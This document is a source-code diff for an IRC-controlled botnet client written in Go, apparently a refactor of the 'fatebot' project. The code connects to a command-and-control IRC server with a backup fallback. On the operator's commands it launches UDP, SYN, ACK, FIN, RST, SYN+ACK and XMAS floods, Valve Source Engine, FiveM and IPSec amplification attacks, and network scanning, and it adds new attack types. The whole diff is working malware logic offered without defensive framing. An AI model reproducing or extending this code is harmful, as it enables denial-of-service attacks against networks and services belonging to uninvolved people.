@@ -7,14 +7,14 @@ import (
 	"os"
 	"runtime"
 
-	"bot/pkg"
+	lib "bot/internal"
 )
 
-var (
+const (
 	IRC_Server        = "" //config IRC server and port here. //ip:port //127.0.0.1:6667
 	IRC_Backup_Server = "" //config like main server.
 	IRC_Channel       = "" //config channel here. //"#Example"
-	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
+	IRC_Chan_Password = "" //config channel password here. //If you didn't have, just leave it blank.
 	IRC_USNM          = "" //config your IRC username here. //For acces to your bot commands.
 )
 
@@ -22,85 +22,147 @@ type reader struct {
 	read string
 }
 
-func (read *reader) permission() bool {
-	return pkg.Find(pkg.Recv(read.read, 0), IRC_USNM)
+func (r *reader) permission() bool {
+	return lib.Find(lib.Recv(r.read, 0), IRC_USNM)
 }
 
-func fatebot(server string) error {
-	conn := pkg.Conn(server)
+func run(server string) error {
+	conn := lib.Conn(server)
 	tp := textproto.NewReader(bufio.NewReader(conn))
 
-	bot := &pkg.BOT{
+	b := &lib.Bot{
 		IRC:     conn,
 		Channel: IRC_Channel,
 		ChanKey: IRC_Chan_Password,
 	}
-	bot.Login()
+	b.Login()
 
 	for {
 		ircRead, err := tp.ReadLine()
 		if err != nil {
 			return err
 		}
-		read := &reader{
+		r := &reader{
 			read: ircRead,
 		}
 
 		go func() {
-			if pkg.Find(ircRead, "PING :") {
-				bot.Send("PONG " + pkg.Recv(ircRead, 1))
+			if lib.Find(ircRead, "PING :") {
+				b.Send("PONG " + lib.Recv(ircRead, 1))
 			}
 		}()
 
 		//Check is user modes and Join IRC channel
-		if pkg.Find(ircRead, "+i") || pkg.Find(ircRead, "+w") || pkg.Find(ircRead, "+x") {
-			bot.Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
+		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
+			b.Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
 		}
 
-		go func() {
-			switch {
-			case pkg.Find(ircRead, "?get") && read.permission():
-				pkg.AttackSwitch = false
-				go bot.GET(pkg.Recv(ircRead, 4))
-				bot.Report("START HTTP GET FLOOD TO: " +
-					pkg.Recv(ircRead, 4))
-			case pkg.Find(ircRead, "?post") && read.permission():
-				pkg.AttackSwitch = false
-				go bot.POST(pkg.Recv(ircRead, 4))
-				bot.Report("START HTTP POST FLOOD TO: " +
-					pkg.Recv(ircRead, 4))
-			case pkg.Find(ircRead, "?udp") && read.permission():
-				pkg.AttackSwitch = false
-				go bot.DUDP(pkg.Recv(ircRead, 4),
-					pkg.Recv(ircRead, 5))
-				bot.Report("START UDP FLOOD TO: " +
-					pkg.Recv(ircRead, 4))
-			case pkg.Find(ircRead, "?icmp") && read.permission():
-				pkg.AttackSwitch = false
-				go bot.ICMP(pkg.Recv(ircRead, 4))
-				bot.Report("START ICMP FLOOD TO: " +
-					pkg.Recv(ircRead, 4))
-			case pkg.Find(ircRead, "?vse") && read.permission():
-				pkg.AttackSwitch = false
-				go bot.VSE(pkg.Recv(ircRead, 4))
-				bot.Report("START VSE FLOOD TO: " +
-					pkg.Recv(ircRead, 4))
-			case pkg.Find(ircRead, "?scan") && read.permission():
-				go bot.ScanMode(pkg.Recv(ircRead, 4),
-					pkg.Recv(ircRead, 5))
-				bot.Report("START SCANNING.")
-			case pkg.Find(ircRead, "?info") && read.permission():
-				bot.ReportInfo()
-			case pkg.Find(ircRead, "?kill") && read.permission():
-				os.Exit(0)
-			case pkg.Find(ircRead, "?stopddos") && read.permission():
-				pkg.AttackSwitch = true
-				bot.Report("STOP ATTACKING.")
-			case pkg.Find(ircRead, "?stopscan") && read.permission():
-				pkg.ScanSwitch = true
-				bot.Report("STOP SCANNING.")
-			}
-		}()
+		switch {
+		case lib.Find(ircRead, "?udp") && r.permission():
+			/*
+				UDP Flood
+			*/
+			lib.AttackSwitch = false
+			go b.UDP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START UDP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?syn") && r.permission():
+			/*
+				SYN Flood
+			*/
+			lib.AttackSwitch = false
+			go b.SYN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START SYN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?ack") && r.permission():
+			/*
+				ACK Flood
+			*/
+			lib.AttackSwitch = false
+			go b.ACK(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START ACK FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?fin") && r.permission():
+			/*
+				FIN Flood
+			*/
+			lib.AttackSwitch = false
+			go b.FIN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START FIN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?rst") && r.permission():
+			/*
+				RST Flood
+			*/
+			lib.AttackSwitch = false
+			go b.RST(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START RST FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?sap") && r.permission():
+			/*
+				SYN+ACK packet Flood
+			*/
+			lib.AttackSwitch = false
+			go b.SAP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START SAP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?xmas") && r.permission():
+			/*
+				XMAS Flood
+			*/
+			lib.AttackSwitch = false
+			go b.XMAS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
+				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
+			b.Report("START XMAS FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?vse") && r.permission():
+			/*
+				Valve Source Engine Amplification
+			*/
+			lib.AttackSwitch = false
+			go b.VSE(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
+			b.Report("START VSE ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?fms") && r.permission():
+			/*
+				FiveM Server Amplification
+			*/
+			lib.AttackSwitch = false
+			go b.FMS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
+			b.Report("START FMS ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?ipsec") && r.permission():
+			/*
+				IPSec Amplification
+			*/
+			lib.AttackSwitch = false
+			go b.IPSEC(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
+			b.Report("START IPSEC ATTACK TO: " + lib.Recv(ircRead, 5))
+		case lib.Find(ircRead, "?scan") && r.permission():
+			/*
+				Bot Scanner
+			*/
+			go b.ScanMode(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
+			b.Report("START SCANNING.")
+		case lib.Find(ircRead, "?info") && r.permission():
+			/*
+				Bot infomation
+			*/
+			b.ReportInfo()
+		case lib.Find(ircRead, "?kill") && r.permission():
+			/*
+				Bot self-close
+			*/
+			os.Exit(0)
+		case lib.Find(ircRead, "?stopddos") && r.permission():
+			/*
+				Stop ddos attacking
+			*/
+			lib.ReportSwitch = true
+			lib.AttackSwitch = true
+		case lib.Find(ircRead, "?stopscan") && r.permission():
+			/*
+				Stop scanning
+			*/
+			lib.ScanSwitch = true
+		}
 	}
 }
 
@@ -109,10 +171,9 @@ func main() {
 	if runtime.GOOS != "linux" {
 		os.Exit(0)
 	}
-
-	if fatebot(IRC_Server) != nil {
+	if run(IRC_Server) != nil {
 		for {
-			if fatebot(IRC_Backup_Server) == nil {
+			if run(IRC_Backup_Server) == nil {
 				break
 			}
 		}
